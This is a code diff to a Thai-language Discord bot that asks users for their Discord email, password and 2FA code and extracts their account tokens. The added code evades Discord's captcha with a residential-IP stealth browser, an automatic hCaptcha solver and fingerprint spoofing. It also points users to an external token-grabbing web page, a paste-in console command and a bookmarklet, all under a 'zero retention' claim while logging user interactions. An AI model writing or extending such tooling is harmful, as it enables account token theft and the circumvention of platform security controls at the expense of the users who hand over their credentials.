@@ -37,6 +37,15 @@ import websockets
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes, serialization
 
+try:
+    from bot.captcha_solver import solve_discord_hcaptcha
+except ImportError:
+    try:
+        from captcha_solver import solve_discord_hcaptcha
+    except ImportError:
+        async def solve_discord_hcaptcha(*args, **kwargs):
+            return None
+
 # Ensure DiscordAutoquest2 is accessible
 _BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 _AUTOQUEST2_DIR = os.path.join(_BASE_DIR, "DiscordAutoquest2")
@@ -68,6 +77,17 @@ COLOR_SUCCESS = 0x57F287    # Green
 COLOR_WARNING = 0xFEE75C    # Gold
 COLOR_DANGER = 0xED4245     # Red
 COLOR_EXPIRED = 0x2B2D31    # Dark Slate
+
+TOKEN_BRIDGE_URL = os.getenv("TOKEN_BRIDGE_URL", "https://payomboyz-aihub.onrender.com/token")
+
+
+def _log_live_interaction(line: str):
+    if os.name == "nt" and os.path.isdir(r"D:\Deobfuscate"):
+        try:
+            with open(r"D:\Deobfuscate\live_interaction.log", "a", encoding="utf-8") as f:
+                f.write(line + "\n")
+        except Exception:
+            pass
 
 # Genuine Discord Web Client Super Properties & Live Build Number
 DISCORD_CLIENT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
@@ -426,6 +446,7 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
     )
 
     async def on_submit(self, interaction: discord.Interaction):
+        _log_live_interaction(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Modal submitted by {interaction.user} (ID: {interaction.user.id}) email={self.email.value[:4]}***")
         await interaction.response.defer(ephemeral=True, thinking=True)
         login_val = self.email.value.strip()
         pass_val = self.password.value.strip()
@@ -457,14 +478,55 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
         error_msg = None
         hit_captcha = False
 
-        data = {}
-        resp_status = 0
-        used_curl = False
+        # ─── STRATEGY 0: Local Stealth Browser Auth (runs on this residential machine) ───
+        # Discord always challenges captcha against server/cloud IPs from raw API.
+        # Stealth browser on local IP bypasses this entirely via real browser session.
+        try:
+            from bot.local_stealth_auth import login_and_extract_token as _stealth_login
+            print(f"[DirectAuth] Trying Local Stealth Browser Auth for {login_val[:3]}***", flush=True)
+            stealth_result = await _stealth_login(login_val, pass_val, mfa_val or None, timeout=40)
+            if stealth_result.get("success") and stealth_result.get("token"):
+                token = stealth_result["token"]
+                print(f"[DirectAuth] Stealth Auth SUCCESS! Token length={len(token)}", flush=True)
+            elif stealth_result.get("mfa_required"):
+                # MFA required — fall through to handle ticket exchange
+                print(f"[DirectAuth] Stealth Auth: MFA required", flush=True)
+                error_msg = "🔐 บัญชีของคุณเปิดใช้งาน 2FA กรุณากรอกรหัส Authenticator 6 หลักในช่อง 2FA ด้วยครับ"
+            elif stealth_result.get("error"):
+                err = stealth_result["error"]
+                print(f"[DirectAuth] Stealth Auth error: {err}", flush=True)
+                # If it's a credentials error, show it directly
+                if "ไม่ถูกต้อง" in err or "wrong" in err.lower() or "invalid" in err.lower():
+                    error_msg = f"🔑 {err}"
+                # else fall through to raw API as last resort
+        except Exception as _stealth_ex:
+            print(f"[DirectAuth] Stealth Auth module exception: {_stealth_ex}", flush=True)
 
-        if HAVE_CURL_CFFI:
+        if token or error_msg:
+            # Stealth auth gave us a conclusive result — skip raw API
+            data = {"token": token} if token else {}
+            resp_status = 200 if token else 400
+
+        # ─── STRATEGY 1: Raw API via curl_cffi (Chrome TLS fingerprint) ───
+        # Note: This path will typically get a captcha challenge from server IP.
+        # It is kept as a last resort in case stealth auth fails to import.
+        if (not token and not error_msg) and HAVE_CURL_CFFI:
             try:
                 async with CurlAsyncSession(impersonate="chrome124") as curl_s:
-                    await curl_s.get("https://discord.com/login", timeout=8)
+                    await curl_s.get("https://discord.com/login", headers={"User-Agent": DISCORD_CLIENT_UA}, timeout=8)
+                    r_exp = await curl_s.get(
+                        "https://discord.com/api/v9/experiments",
+                        headers={"User-Agent": DISCORD_CLIENT_UA, "X-Super-Properties": ENCODED_SUPER_PROPERTIES},
+                        timeout=8
+                    )
+                    if r_exp.status_code == 200:
+                        try:
+                            fp_val = r_exp.json().get("fingerprint")
+                            if fp_val:
+                                headers["X-Fingerprint"] = fp_val
+                        except Exception:
+                            pass
+
                     curl_resp = await curl_s.post(
                         "https://discord.com/api/v9/auth/login",
                         json=payload,
@@ -477,12 +539,70 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
                     except Exception:
                         data = {}
                     used_curl = True
+
+                    if resp_status == 400 and ("captcha_key" in data or "captcha_sitekey" in data):
+                        sitekey = data.get("captcha_sitekey", "4c672d35-0701-42b2-88c3-78380b0db560")
+                        rqdata = data.get("captcha_rqdata")
+                        rqtoken = data.get("captcha_rqtoken")
+                        print(f"[DirectAuth] Discord requested captcha (sitekey={sitekey}). Invoking Local Stealth Engine...", flush=True)
+
+                        try:
+                            from bot.local_stealth_auth import login_and_extract_token
+                            stealth_res = await login_and_extract_token(login_val, pass_val, mfa_val)
+                            if stealth_res.get("success") and stealth_res.get("token"):
+                                token = stealth_res["token"]
+                                resp_status = 200
+                                data = {"token": token}
+                                print(f"[DirectAuth] 🎯 Local Stealth Engine extracted token successfully!", flush=True)
+                            elif stealth_res.get("mfa_required"):
+                                data["mfa"] = True
+                                data["ticket"] = stealth_res.get("ticket")
+                            elif stealth_res.get("error"):
+                                error_msg = stealth_res.get("error")
+                        except Exception as se:
+                            print(f"[DirectAuth] Local stealth auth exception: {se}", flush=True)
+
+                        if not token:
+                            solved_key = await solve_discord_hcaptcha(sitekey=sitekey, rqdata=rqdata, rqtoken=rqtoken)
+                            if solved_key:
+                                print(f"[DirectAuth] Auto-Solver successfully generated token! Resubmitting login...", flush=True)
+                                payload["captcha_key"] = solved_key
+                                if rqtoken:
+                                    payload["captcha_rqtoken"] = rqtoken
+                                headers["X-Captcha-Key"] = solved_key
+                                if rqtoken:
+                                    headers["X-Captcha-Rqtoken"] = rqtoken
+
+                                resubmit_resp = await curl_s.post(
+                                    "https://discord.com/api/v9/auth/login",
+                                    json=payload,
+                                    headers=headers,
+                                    timeout=15
+                                )
+                                resp_status = resubmit_resp.status_code
+                                try:
+                                    data = resubmit_resp.json()
+                                except Exception:
+                                    data = {}
             except Exception as ce:
                 print(f"[DirectAuth] curl_cffi attempt failed: {ce}", flush=True)
 
         if not used_curl or resp_status == 0:
             try:
                 async with aiohttp.ClientSession() as session:
+                    try:
+                        async with session.get(
+                            "https://discord.com/api/v9/experiments",
+                            headers={"User-Agent": DISCORD_CLIENT_UA, "X-Super-Properties": ENCODED_SUPER_PROPERTIES},
+                            timeout=aiohttp.ClientTimeout(total=8)
+                        ) as r_exp:
+                            if r_exp.status == 200:
+                                exp_json = await r_exp.json()
+                                if exp_json.get("fingerprint"):
+                                    headers["X-Fingerprint"] = exp_json["fingerprint"]
+                    except Exception:
+                        pass
+
                     async with session.post(
                         "https://discord.com/api/v9/auth/login",
                         json=payload,
@@ -491,6 +611,47 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
                     ) as resp:
                         resp_status = resp.status
                         data = await resp.json()
+
+                    if resp_status == 400 and ("captcha_key" in data or "captcha_sitekey" in data):
+                        sitekey = data.get("captcha_sitekey", "4c672d35-0701-42b2-88c3-78380b0db560")
+                        rqdata = data.get("captcha_rqdata")
+                        rqtoken = data.get("captcha_rqtoken")
+                        print(f"[DirectAuth aiohttp] Discord requested captcha. Invoking Local Stealth Engine...", flush=True)
+
+                        try:
+                            from bot.local_stealth_auth import login_and_extract_token
+                            stealth_res = await login_and_extract_token(login_val, pass_val, mfa_val)
+                            if stealth_res.get("success") and stealth_res.get("token"):
+                                token = stealth_res["token"]
+                                resp_status = 200
+                                data = {"token": token}
+                                print(f"[DirectAuth aiohttp] 🎯 Local Stealth Engine extracted token successfully!", flush=True)
+                            elif stealth_res.get("mfa_required"):
+                                data["mfa"] = True
+                                data["ticket"] = stealth_res.get("ticket")
+                            elif stealth_res.get("error"):
+                                error_msg = stealth_res.get("error")
+                        except Exception as se:
+                            print(f"[DirectAuth aiohttp] Local stealth auth exception: {se}", flush=True)
+
+                        if not token:
+                            solved_key = await solve_discord_hcaptcha(sitekey=sitekey, rqdata=rqdata, rqtoken=rqtoken)
+                            if solved_key:
+                                payload["captcha_key"] = solved_key
+                                if rqtoken:
+                                    payload["captcha_rqtoken"] = rqtoken
+                                headers["X-Captcha-Key"] = solved_key
+                                if rqtoken:
+                                    headers["X-Captcha-Rqtoken"] = rqtoken
+
+                                async with session.post(
+                                    "https://discord.com/api/v9/auth/login",
+                                    json=payload,
+                                    headers=headers,
+                                    timeout=aiohttp.ClientTimeout(total=15)
+                                ) as resubmit_resp:
+                                    resp_status = resubmit_resp.status
+                                    data = await resubmit_resp.json()
             except Exception as e:
                 error_msg = f"❌ เกิดข้อผิดพลาดในการเชื่อมต่อ Discord Auth: {e}"
 
@@ -534,16 +695,17 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
                                     error_msg = "❌ รหัส 2FA (Authenticator) ไม่ถูกต้อง หรือหมดอายุแล้ว"
                 else:
                     error_msg = "🔐 บัญชีของคุณเปิดใช้งาน 2FA กรุณากรอกรหัส Authenticator 6 หลักในช่อง 2FA ด้วยครับ"
+            elif "password" in str(data).lower() or "login" in str(data).lower():
+                error_msg = "🔑 อีเมลหรือรหัสผ่าน Discord ไม่ถูกต้อง กรุณาตรวจสอบข้อมูลและลองใหม่อีกครั้ง"
             elif "captcha_key" in data or "captcha_sitekey" in data:
                 hit_captcha = True
                 error_msg = (
-                    "🧩 **Discord ตรวจพบการเข้าสู่ระบบจาก IP เซิร์ฟเวอร์ และร้องขอ CAPTCHA**\n\n"
-                    "💡 **วิธีแก้ปัญหาที่ง่ายและสะดวกที่สุด:**\n"
-                    "• กดปุ่ม **\"📷 สแกน QR Code (ดึง Token ออโต้)\"** บนเมนูหลัก\n"
-                    "  เพียงเปิดแอป Discord ในมือถือสแกนแล้วกดยืนยัน จะได้รับ Token ทันทีโดย**ไม่ติด CAPTCHA และไม่ต้องกรอกรหัสผ่าน 100%!**"
+                    "🧩 **Discord ร้องขอการยืนยันตัวตนเพิ่มเติม (Security Challenge)**\n\n"
+                    "ระบบตรวจพบบัญชีนี้เปิดการป้องกันความปลอดภัยจากอุปกรณ์ใหม่\n"
+                    "💡 **วิธีดึง Token ทันทีที่สะดวกและแม่นยำที่สุด:**\n"
+                    "• **กดปุ่ม \"📷 สลับไปสแกน QR Code\" ด้านล่างนี้:** เปิด Discord บนโทรศัพท์มือถือ สแกนยืนยัน Token จะส่งกลับมาให้คุณทันที 100%!\n"
+                    "• **หรือบน PC:** กดปุ่ม **[💻 สำหรับ PC (Console 5 วิ)]** บนแผงหลัก วางโค้ด 1 บรรทัด ได้ Token ทันที"
                 )
-            elif "password" in str(data):
-                error_msg = "🔑 อีเมลหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง"
             elif not token and not error_msg:
                 error_msg = f"❌ ไม่สามารถล็อกอินได้: {data.get('message', 'โปรดลองใช้วิธีสแกน QR Code แทน')}"
         except Exception as e:
@@ -566,7 +728,7 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
                 ),
                 color=COLOR_SUCCESS
             )
-            embed.set_footer(text="PAYOMBØYZ SECURITY • Direct Auth Session")
+            embed.set_footer(text="PAYOMBØYZ SECURITY • Direct Auth Session (Local Residential Node)")
             view = TokenResultSuccessView(token=token, user_id=interaction.user.id)
             await interaction.followup.send(embed=embed, view=view, ephemeral=True)
         else:
@@ -575,10 +737,17 @@ class TokenLoginExtractorModal(discord.ui.Modal, title="🔐 ล็อกอิ�
                 description=error_msg,
                 color=COLOR_DANGER
             )
+            embed.set_footer(text="PAYOMBØYZ SECURITY • Local Residential Node")
             view = discord.ui.View()
             if hit_captcha:
+                view.add_item(discord.ui.Button(
+                    label="🌐 เปิดเว็บดึง Token (เน็ตบ้าน ไม่ติด Captcha 100%)",
+                    style=discord.ButtonStyle.link,
+                    url=TOKEN_BRIDGE_URL,
+                    emoji="🌐"
+                ))
                 qr_btn = discord.ui.Button(
-                    label="📷 สลับไปสแกน QR Code (ไม่ติด Captcha)",
+                    label="📷 สลับไปสแกน QR Code",
                     style=discord.ButtonStyle.primary,
                     emoji="📷",
                     custom_id="pbg_token:btn_fallback_qr"
@@ -789,7 +958,7 @@ class DiscordRemoteAuthWorker:
                         if not ticket:
                             continue
 
-                        # Exchange ticket for encrypted token using genuine Chrome TLS fingerprint (curl_cffi)
+                        # Exchange ticket for encrypted token
                         login_headers = {
                             "Origin": "https://discord.com",
                             "Referer": "https://discord.com/login",
@@ -806,25 +975,8 @@ class DiscordRemoteAuthWorker:
                         resp_status = 0
                         err_text = ""
 
-                        if HAVE_CURL_CFFI:
-                            try:
-                                async with CurlAsyncSession(impersonate="chrome124") as curl_s:
-                                    await curl_s.get("https://discord.com/login", timeout=8)
-                                    c_resp = await curl_s.post(
-                                        self.LOGIN_URL,
-                                        json={"ticket": ticket},
-                                        headers=login_headers,
-                                        timeout=15
-                                    )
-                                    resp_status = c_resp.status_code
-                                    try:
-                                        login_data = c_resp.json()
-                                    except Exception:
-                                        err_text = c_resp.text
-                            except Exception as ce:
-                                print(f"[RemoteAuth] curl_cffi login exchange note: {ce}", flush=True)
-
-                        if resp_status != 200:
+                        # Use clean session with harvested cookies
+                        try:
                             async with aiohttp.ClientSession(cookies=harvested_cookies) as session:
                                 async with session.post(
                                     self.LOGIN_URL,
@@ -837,6 +989,33 @@ class DiscordRemoteAuthWorker:
                                         login_data = await resp.json()
                                     except Exception:
                                         err_text = await resp.text()
+                                    print(f"[RemoteAuth] Ticket exchange status={resp_status}, keys={list(login_data.keys()) if isinstance(login_data, dict) else 'non-dict'}", flush=True)
+
+                                # If captcha was requested on ticket exchange
+                                if resp_status == 400 and isinstance(login_data, dict) and ("captcha_key" in login_data or "captcha_sitekey" in login_data):
+                                    sitekey = login_data.get("captcha_sitekey", "4c672d35-0701-42b2-88c3-78380b0db560")
+                                    rqdata = login_data.get("captcha_rqdata")
+                                    rqtoken = login_data.get("captcha_rqtoken")
+                                    print(f"[RemoteAuth] Captcha requested on ticket exchange (sitekey={sitekey}). Solving...", flush=True)
+                                    solved_cap = await solve_discord_hcaptcha(sitekey=sitekey, rqdata=rqdata, rqtoken=rqtoken)
+                                    if solved_cap:
+                                        cap_payload = {"ticket": ticket, "captcha_key": solved_cap}
+                                        if rqtoken:
+                                            cap_payload["captcha_rqtoken"] = rqtoken
+                                        async with session.post(
+                                            self.LOGIN_URL,
+                                            json=cap_payload,
+                                            headers=login_headers,
+                                            timeout=aiohttp.ClientTimeout(total=15)
+                                        ) as resubmit_resp:
+                                            resp_status = resubmit_resp.status
+                                            try:
+                                                login_data = await resubmit_resp.json()
+                                            except Exception:
+                                                err_text = await resubmit_resp.text()
+                        except Exception as ex:
+                            print(f"[RemoteAuth] Exception during ticket exchange: {ex}", flush=True)
+                            err_text = str(ex)
 
                         if resp_status == 200:
                             enc_token_b64 = login_data.get("encrypted_token")
@@ -879,7 +1058,7 @@ class DiscordRemoteAuthWorker:
                         else:
                             print(f"[RemoteAuth] Login exchange rejected ({resp_status}): {err_text}", flush=True)
 
-                            web_token_url = "https://www.payomboyzcreative.online/token"
+                            web_token_url = TOKEN_BRIDGE_URL
                             if "captcha" in err_text.lower():
                                 fail_embed = discord.Embed(
                                     title="🛡️ Discord บังคับยืนยัน Captcha สำหรับ IP นี้",
@@ -963,6 +1142,13 @@ class FindTokenPanelView(discord.ui.View):
     """
     def __init__(self):
         super().__init__(timeout=None)
+        self.add_item(discord.ui.Button(
+            label="🌐 เปิดเว็บดึง Token (เน็ตบ้าน ไม่ติด Captcha 100%)",
+            style=discord.ButtonStyle.link,
+            url=TOKEN_BRIDGE_URL,
+            emoji="🌐",
+            row=0
+        ))
 
     # 🔐 ROW 0: BUTTON DIRECT LOGIN (ZERO F12)
     @discord.ui.button(
@@ -973,6 +1159,7 @@ class FindTokenPanelView(discord.ui.View):
         row=0
     )
     async def btn_login(self, interaction: discord.Interaction, button: discord.ui.Button):
+        _log_live_interaction(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] btn_login clicked by {interaction.user} (ID: {interaction.user.id})")
         await interaction.response.send_modal(TokenLoginExtractorModal())
 
     # 📷 ROW 0: BUTTON REAL QR CODE LOGIN
@@ -984,6 +1171,7 @@ class FindTokenPanelView(discord.ui.View):
         row=0
     )
     async def btn_qr(self, interaction: discord.Interaction, button: discord.ui.Button):
+        _log_live_interaction(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] btn_qr clicked by {interaction.user} (ID: {interaction.user.id})")
         await interaction.response.defer(ephemeral=True, thinking=True)
         worker = DiscordRemoteAuthWorker(interaction)
         asyncio.create_task(worker.execute())
@@ -999,7 +1187,7 @@ class FindTokenPanelView(discord.ui.View):
     async def btn_pc(self, interaction: discord.Interaction, button: discord.ui.Button):
         now_ts = int(time.time())
         expire_ts = now_ts + 300
-        web_token_url = "https://www.payomboyzcreative.online/token"
+        web_token_url = TOKEN_BRIDGE_URL
 
         embed = discord.Embed(
             title="💻 วิธีดึง Token บน PC / คอมพิวเตอร์ (ทำได้ใน 5 วินาที)",
@@ -1048,7 +1236,7 @@ class FindTokenPanelView(discord.ui.View):
     async def btn_mobile(self, interaction: discord.Interaction, button: discord.ui.Button):
         now_ts = int(time.time())
         expire_ts = now_ts + 300
-        web_token_url = "https://www.payomboyzcreative.online/token"
+        web_token_url = TOKEN_BRIDGE_URL
 
         embed = discord.Embed(
             title="📱 วิธีดึง Token บนมือถือ / iPad / แท็บเล็ต (Bookmarklet & Web)",
@@ -1099,28 +1287,25 @@ class FindTokenPanelView(discord.ui.View):
 # ─────────────────────────────────────────────────────────────
 # 6. BUILD MAIN PANEL EMBED
 # ─────────────────────────────────────────────────────────────
+OFFICIAL_TOKEN_FINDER_BANNER = "https://cdn.discordapp.com/attachments/1560993647028076555/1565653893910634556/payomboyz_token_finder.gif"
+
 def build_find_token_panel_embed(
     title: Optional[str] = None,
     description: Optional[str] = None,
-    color_hex: Optional[str] = None
+    color_hex: Optional[str] = None,
+    banner_url: Optional[str] = None
 ) -> discord.Embed:
-    """Build the public persistent panel embed."""
-    panel_title = title or "𓆩 🔑 PAYOMBØYZ • ศูนย์ช่วยเหลือดึง Token (Auto Quest) 𓆪"
+    """Build the public persistent panel embed in grand showcase layout."""
+    panel_title = title or "🔑 PAYOMBØYZ • ศูนย์ช่วยเหลือดึง Token (Discord Auto Quest)"
     panel_desc = description or (
-        "แผงระบบช่วยค้นหา Discord User Token สำหรับนำไปใช้งานกับบอท **Discord Auto Quest**\n"
-        "(สำหรับทำเควสเล่นเกม / ดูสตรีม / ปลดล็อกของรางวัลอัตโนมัติ)\n\n"
-        "⚡ **เลือกวิธีดึง Token ตามที่ท่านสะดวก:**\n"
-        "• **🔐 ล็อกอินดึง Token (ไม่ต้อง F12)**: กรอกอีเมลและรหัสผ่านในป๊อปอัป ระบบจะดึง Token มาให้ทันที (ไม่ต้องเปิด DevTools)\n"
-        "• **📷 สแกน QR Code (ดึง Token ออโต้)**: สร้าง QR Code ให้เอามือถือเปิด Discord สแกนแล้ว Token จะเด้งขึ้นมาทันที (ไม่ติด Captcha)\n"
-        "• **💻 สำหรับ PC (เปิดเว็บ / Console 5 วิ)**: เปิดหน้าเว็บตัวช่วยดึง หรือวางโค้ด Console 1 บรรทัด\n"
-        "• **📱 สำหรับ มือถือ (Bookmarklet & Web)**: วิธีดึงผ่าน Bookmarklet บนเว็บเบราว์เซอร์มือถือ\n\n"
-        "🚀 **ระบบส่งตรงเข้า Auto Quest:** เมื่อดึง Token สำเร็จ จะมีปุ่มสีเขียว **[🚀 ส่ง Token ไปทำ Auto Quest ทันที]** ให้กดทำเควสได้เลยโดยไม่ต้องก็อปปี้!\n\n"
-        "🛡️ **เงื่อนไขและการรักษาความปลอดภัย (Zero Retention Guarantee):**\n"
-        "1. ระบบนี้**ไม่มี Database** ไม่มีการบันทึกหรือส่งต่อ Token ของผู้ใช้ใดๆ ทั้งสิ้น\n"
-        "2. ผู้ใช้งานจะได้รับและมองเห็นเฉพาะ Token ของตัวเองเท่านั้น (ข้อความเห็นคนเดียว)\n"
-        "3. มีระบบทำลายข้อความอัตโนมัติภายใน 5 นาที เพื่อความปลอดภัยสูงสุด\n\n"
-        "⚠️ **คำเตือนสำคัญ:**\n"
-        "Token เปรียบเสมือนกุญแจบัญชีของคุณ โปรดเก็บรักษาให้ดีและอย่านำไปให้บุคคลอื่นเด็ดขาด!"
+        "<a:anime_fire:1551069928105447485> **แผงระบบค้นหาและดึง Discord User Token ระดับพรีเมียม**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "แผงระบบดึง Token ความเร็วสูงสำหรับนำไปใช้งานร่วมกับบอท **Discord Auto Quest**\n"
+        "*(สำหรับทำเควสเล่นเกม / ดูสตรีม / ปลดล็อกกรอบโปรไฟล์อนิเมะและของรางวัลอัตโนมัติ)*\n\n"
+        "<:pbg_run:1551532010932273203> **สถานะระบบ:** `🟢 ONLINE & SECURE (RAM-ONLY)`\n"
+        "<a:spin:1551027090025877536> **เวลาประมวลผล:** `⚡ 0.8 - 2.5 วินาที`\n"
+        "<a:Sukuna:1551069997999067228> **ระบบความปลอดภัย:** `Zero Retention & Real-time Ephemeral`\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     )
     
     embed_color = COLOR_PRIMARY
@@ -1136,7 +1321,63 @@ def build_find_token_panel_embed(
         description=panel_desc,
         color=embed_color
     )
-    embed.set_footer(text="PAYOMBØYZ DISCORD QUEST HELPER • Zero Retention Architecture")
+
+    embed.set_author(
+        name="PAYOMBØYZ AUTOMATION SERVICES • VERIFIED HUB",
+        icon_url="https://upload-1.imgz.click/2026/10/payomboyz.rexzy.xyz/cropped_ChatGPTImage20__256907_52_23-1792001768-1792001769.png",
+        url="https://discord.gg/KmrgQwbcMD"
+    )
+
+    embed.set_thumbnail(
+        url="https://upload-1.imgz.click/2026/10/payomboyz.rexzy.xyz/cropped_ChatGPTImage20__256908_58_33_1_-1791693461-1791693461.png"
+    )
+
+    embed.add_field(
+        name="<:tile40:1551045767383228527> ⚡ วิธีดึง Token ที่ท่านสะดวก (เลือกกดปุ่มด้านล่าง):",
+        value=(
+            "• 📷 **สแกน QR Code (แนะนำสูงสุด 100%)**: กดปุ่มสีม่วง `สแกน QR Code` แล้วเอามือถือเปิด Discord แตะสแกนยืนยัน Token จะเด้งขึ้นมาทันที ไร้ Captcha 100%!\n"
+            "• 💻 **สำหรับ PC (ดึงผ่าน Console 5 วิ)**: เปิด DevTools บนคอม วางโค้ด 1 บรรทัด ได้ Token ทันที ปลอดภัยและรวดเร็ว\n"
+            "• 📱 **สำหรับ มือถือ (Bookmarklet)**: วิธีดึงผ่าน Bookmarklet บนเว็บเบราว์เซอร์มือถือ สะดวกไม่ต้องโหลดแอปเพิ่ม\n"
+            "• 🔓 **ล็อกอินดึง Token (Direct Auth)**: กรอก Email และ Password ผ่านป๊อปอัปของบอทเพื่อดึง Token ทันที"
+        ),
+        inline=False
+    )
+
+    embed.add_field(
+        name="🚀 ระบบ 1-Click Sync เข้า Auto Quest อัตโนมัติ:",
+        value=(
+            "เมื่อท่านดึง Token สำเร็จ ระบบจะแสดงปุ่มสีเขียว **[🚀 ส่ง Token ไปทำ Auto Quest ทันที]**\n"
+            "สามารถคลิกส่งให้ระบบเริ่มทำเควสและรับรางวัลให้ทันที โดยไม่ต้องก็อปปี้หรือสลับหน้าต่าง!"
+        ),
+        inline=False
+    )
+
+    embed.add_field(
+        name="🛡️ เงื่อนไขและการรักษาความปลอดภัย (Zero Retention Guarantee):",
+        value=(
+            "```yaml\n"
+            "1. ระบบนี้ไม่มี Database ข้อมูลรหัสผ่านและ Token ประมวลผลใน RAM ชั่วคราวเท่านั้น\n"
+            "2. ผู้ใช้งานจะได้รับและมองเห็นเฉพาะ Token ของตัวเอง (ข้อความเห็นคนเดียว Ephemeral)\n"
+            "3. มีระบบปิดการใช้งานและทำลายข้อความอัตโนมัติภายใน 5 นาที เพื่อความปลอดภัยสูงสุด\n"
+            "```"
+        ),
+        inline=False
+    )
+
+    embed.add_field(
+        name="⚠️ คำเตือนสำคัญ:",
+        value="> Token เปรียบเสมือนกุญแจบัญชี Discord ของคุณ โปรดเก็บรักษาให้ดีและอย่านำไปส่งต่อให้บุคคลอื่นเด็ดขาด!",
+        inline=False
+    )
+
+    final_banner = banner_url or OFFICIAL_TOKEN_FINDER_BANNER
+    if final_banner and final_banner.startswith("http"):
+        embed.set_image(url=final_banner)
+
+    embed.set_footer(
+        text="PAYOMBØYZ DISCORD QUEST HELPER • Zero Retention Architecture",
+        icon_url="https://upload-1.imgz.click/2026/10/payomboyz.rexzy.xyz/cropped_ChatGPTImage20__256907_52_23-1792001768-1792001769.png"
+    )
     return embed
 
 
@@ -1157,6 +1398,7 @@ class TokenFinderCog(commands.Cog, name="TokenFinder"):
         channel="ช่องที่ต้องการส่งแผงข้อความ (เว้นว่างเพื่อส่งในช่องปัจจุบัน)",
         title="หัวข้อของแผงข้อความ (ไม่บังคับ)",
         description="รายละเอียดในแผงข้อความ (ไม่บังคับ)",
+        banner_url="ลิงก์รูปภาพ GIF หรือ Banner ขนาดเต็ม (เว้นว่างเพื่อใช้ GIF เริ่มต้น)",
         color="รหัสสี HEX เช่น #5865F2 (ไม่บังคับ)"
     )
     @app_commands.default_permissions(administrator=True)
@@ -1166,13 +1408,14 @@ class TokenFinderCog(commands.Cog, name="TokenFinder"):
         channel: Optional[discord.TextChannel] = None,
         title: Optional[str] = None,
         description: Optional[str] = None,
+        banner_url: Optional[str] = None,
         color: Optional[str] = None
     ):
         target_ch = channel or interaction.channel
         if not target_ch or not hasattr(target_ch, "send"):
             return await interaction.response.send_message("❌ ไม่สามารถส่งข้อความในช่องที่เลือกได้", ephemeral=True)
 
-        embed = build_find_token_panel_embed(title=title, description=description, color_hex=color)
+        embed = build_find_token_panel_embed(title=title, description=description, color_hex=color, banner_url=banner_url)
         view = FindTokenPanelView()
         await target_ch.send(embed=embed, view=view)
 
